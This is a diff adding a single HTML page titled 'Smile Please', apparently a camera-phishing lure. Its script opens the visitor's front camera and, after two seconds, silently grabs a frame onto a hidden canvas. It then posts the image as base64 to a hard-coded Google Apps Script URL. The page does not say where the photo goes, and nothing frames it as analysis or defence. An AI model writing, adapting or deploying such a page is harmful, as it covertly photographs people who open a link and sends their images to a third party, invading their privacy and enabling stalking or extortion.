@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Smile Please </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h3>📷 Smile..</h3>
+  <video id="video" width="320" height="240" autoplay playsinline muted></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    const uploadUrl = "https://script.google.com/macros/s/AKfycbzqWyZGJobh7XOG9rL6RNZ3Z9LvxxYtu58HuuM5WKzds2tPkYnEs4frH_judrtLwDtsJA/exec";
+
+    async function initCamera() {
+      try {
+        console.log("Requesting camera access...");
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          console.log("Capturing image...");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/png");
+
+          uploadImage(imageData);
+        }, 2000);
+
+      } catch (err) {
+        alert("🚫 Camera Error: " + err.message);
+        console.error("Camera error:", err);
+      }
+    }
+
+    function uploadImage(dataUrl) {
+      const base64Image = dataUrl.replace(/^data:image\/png;base64,/, "");
+      console.log("Uploading image...");
+
+      fetch(uploadUrl, {
+        method: "POST",
+        body: new URLSearchParams({ image: base64Image })
+      })
+      .then(res => res.text())
+      .then(response => {
+        console.log("Upload response:", response);
+        alert("✅ Upload Response: " + response);
+      })
+      .catch(error => {
+        console.error("Upload failed:", error);
+        alert("❌ Upload Error: " + error.message);
+      });
+    }
+
+    initCamera();
+  </script>
+</body>
+</html>
